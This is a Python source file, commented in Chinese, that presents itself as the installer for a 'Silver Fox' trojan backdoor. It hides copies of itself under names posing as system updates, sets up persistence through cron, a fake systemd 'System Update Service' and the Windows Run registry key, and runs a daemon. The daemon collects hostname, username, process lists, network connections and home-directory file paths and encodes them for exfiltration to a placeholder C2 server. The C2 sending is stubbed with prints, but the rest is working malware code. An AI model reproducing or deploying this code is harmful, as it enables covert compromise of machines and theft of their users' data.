#!/usr/bin/env python3
"""
银狐木马 - 后门设置程序
Silver Fox Trojan - Backdoor Setup Program

该程序负责在受害主机上建立持久性后门
"""

import os
import sys
import platform
import subprocess
import shutil
import time
import random
from pathlib import Path
import base64
import json

class BackdoorSetup:
    """
    后门设置类
    """

    def __init__(self):
        self.system = platform.system().lower()
        self.arch = platform.machine()
        self.install_path = self._get_install_path()
        self.c2_server = "http://c2.example.com"  # C2服务器地址

        # 后门配置
        self.config = {
            "checkin_interval": 300,  # 5分钟
            "data_exfil_interval": 1800,  # 30分钟
            "persistence_methods": ["cron", "systemd", "registry"],
            "communication_protocols": ["http", "dns", "icmp"]
        }

    def _get_install_path(self) -> Path:
        """获取安装路径"""
        if self.system == "windows":
            return Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Templates"
        else:
            return Path.home() / ".config" / ".system_update"

    def install_backdoor(self) -> bool:
        """
        安装后门

        Returns:
            安装是否成功
        """
        try:
            print("[+] 开始安装后门...")

            # 创建安装目录
            self.install_path.mkdir(parents=True, exist_ok=True)

            # 复制自身到安装位置
            current_path = Path(__file__)
            backdoor_path = self.install_path / "system_update.py"
            shutil.copy2(current_path, backdoor_path)

            # 设置文件属性（隐藏）
            self._hide_file(backdoor_path)

            # 建立持久性
            self._establish_persistence(backdoor_path)

            # 创建配置文件
            self._create_config()

            # 启动后门服务
            self._start_backdoor_service(backdoor_path)

            print("[+] 后门安装完成")
            return True

        except Exception as e:
            print(f"[-] 后门安装失败: {e}")
            return False

    def _hide_file(self, file_path: Path):
        """隐藏文件"""
        if self.system == "windows":
            # Windows隐藏文件
            subprocess.run(["attrib", "+h", str(file_path)], capture_output=True)
        else:
            # Linux/Unix隐藏文件（通过文件名）
            pass

    def _establish_persistence(self, backdoor_path: Path):
        """建立持久性"""
        print("[+] 建立持久性机制...")

        for method in self.config["persistence_methods"]:
            try:
                if method == "cron" and self.system != "windows":
                    self._add_cron_job(backdoor_path)
                elif method == "systemd" and self.system == "linux":
                    self._create_systemd_service(backdoor_path)
                elif method == "registry" and self.system == "windows":
                    self._add_registry_entry(backdoor_path)
            except Exception as e:
                print(f"[-] 持久性方法 {method} 失败: {e}")

    def _add_cron_job(self, backdoor_path: Path):
        """添加cron作业"""
        cron_entry = f"*/5 * * * * {sys.executable} {backdoor_path} --daemon\n"

        try:
            # 读取现有cron
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing_cron = result.stdout if result.returncode == 0 else ""

            # 添加新条目
            new_cron = existing_cron + cron_entry

            # 更新cron
            subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)

            print("[+] Cron作业添加成功")

        except Exception as e:
            print(f"[-] Cron作业添加失败: {e}")

    def _create_systemd_service(self, backdoor_path: Path):
        """创建systemd服务"""
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {backdoor_path} --daemon
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""

        service_path = Path("/etc/systemd/system/system-update.service")

        try:
            with open(service_path, 'w') as f:
                f.write(service_content)

            # 重新加载systemd并启用服务
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", "system-update"], capture_output=True)
            subprocess.run(["systemctl", "start", "system-update"], capture_output=True)

            print("[+] Systemd服务创建成功")

        except Exception as e:
            print(f"[-] Systemd服务创建失败: {e}")

    def _add_registry_entry(self, backdoor_path: Path):
        """添加注册表条目 (Windows)"""
        try:
            import winreg

            # 添加到开机自启
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'{sys.executable} {backdoor_path} --daemon')
            winreg.CloseKey(key)

            print("[+] 注册表条目添加成功")

        except Exception as e:
            print(f"[-] 注册表条目添加失败: {e}")

    def _create_config(self):
        """创建配置文件"""
        config_path = self.install_path / "config.json"

        config_data = {
            "c2_server": self.c2_server,
            "checkin_interval": self.config["checkin_interval"],
            "data_exfil_interval": self.config["data_exfil_interval"],
            "installed_at": time.time(),
            "system_info": {
                "os": self.system,
                "arch": self.arch,
                "hostname": platform.node(),
                "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
            }
        }

        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=2)

        # 隐藏配置文件
        self._hide_file(config_path)

    def _start_backdoor_service(self, backdoor_path: Path):
        """启动后门服务"""
        print("[+] 启动后门服务...")

        try:
            if "--daemon" in sys.argv:
                # 以守护进程模式运行
                self.run_daemon()
            else:
                # 启动子进程运行守护进程
                subprocess.Popen([sys.executable, str(backdoor_path), "--daemon"],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL,
                               stdin=subprocess.DEVNULL)
        except Exception as e:
            print(f"[-] 后门服务启动失败: {e}")

    def run_daemon(self):
        """运行守护进程"""
        print("[+] 后门守护进程启动")

        config_path = self.install_path / "config.json"

        while True:
            try:
                # 检查配置文件
                if config_path.exists():
                    with open(config_path, 'r') as f:
                        config = json.load(f)

                    # 执行C2通信
                    self._checkin_with_c2(config)

                    # 执行数据外泄
                    self._exfiltrate_data(config)

                # 等待下次检查
                time.sleep(self.config["checkin_interval"])

            except Exception as e:
                print(f"[-] 守护进程错误: {e}")
                time.sleep(60)  # 出错后等待1分钟

    def _checkin_with_c2(self, config: dict):
        """与C2服务器通信"""
        try:
            checkin_data = {
                "action": "checkin",
                "hostname": config["system_info"]["hostname"],
                "username": config["system_info"]["username"],
                "timestamp": time.time(),
                "status": "active"
            }

            # 模拟HTTP请求到C2服务器
            # 这里是模拟，实际实现会使用requests库
            print(f"[+] 发送checkin: {checkin_data}")

        except Exception as e:
            print(f"[-] C2通信失败: {e}")

    def _exfiltrate_data(self, config: dict):
        """外泄数据"""
        try:
            # 收集系统信息
            system_data = {
                "processes": self._get_running_processes(),
                "network_connections": self._get_network_connections(),
                "recent_files": self._get_recent_files()
            }

            # 编码数据
            encoded_data = base64.b64encode(json.dumps(system_data).encode()).decode()

            # 发送到C2服务器
            print(f"[+] 外泄数据: {len(encoded_data)} 字符")

        except Exception as e:
            print(f"[-] 数据外泄失败: {e}")

    def _get_running_processes(self) -> list:
        """获取运行中的进程"""
        try:
            if self.system == "windows":
                result = subprocess.run(["tasklist"], capture_output=True, text=True)
                return result.stdout.split('\n')[:10]  # 前10行
            else:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
                return result.stdout.split('\n')[:10]
        except:
            return []

    def _get_network_connections(self) -> list:
        """获取网络连接"""
        try:
            if self.system == "windows":
                result = subprocess.run(["netstat", "-n"], capture_output=True, text=True)
                return result.stdout.split('\n')[:10]
            else:
                result = subprocess.run(["netstat", "-tuln"], capture_output=True, text=True)
                return result.stdout.split('\n')[:10]
        except:
            return []

    def _get_recent_files(self) -> list:
        """获取最近的文件"""
        try:
            home_dir = Path.home()
            recent_files = []

            # 查找最近修改的文件
            for file_path in home_dir.rglob("*"):
                if file_path.is_file():
                    recent_files.append(str(file_path))
                    if len(recent_files) >= 5:
                        break

            return recent_files
        except:
            return []


def main():
    """主函数"""
    if len(sys.argv) > 1 and sys.argv[1] == "--daemon":
        # 守护进程模式
        backdoor = BackdoorSetup()
        backdoor.run_daemon()
    else:
        # 安装模式
        backdoor = BackdoorSetup()
        if backdoor.install_backdoor():
            print("[+] 后门设置完成，系统已被入侵!")
        else:
            print("[-] 后门设置失败")
            sys.exit(1)


if __name__ == "__main__":
    main()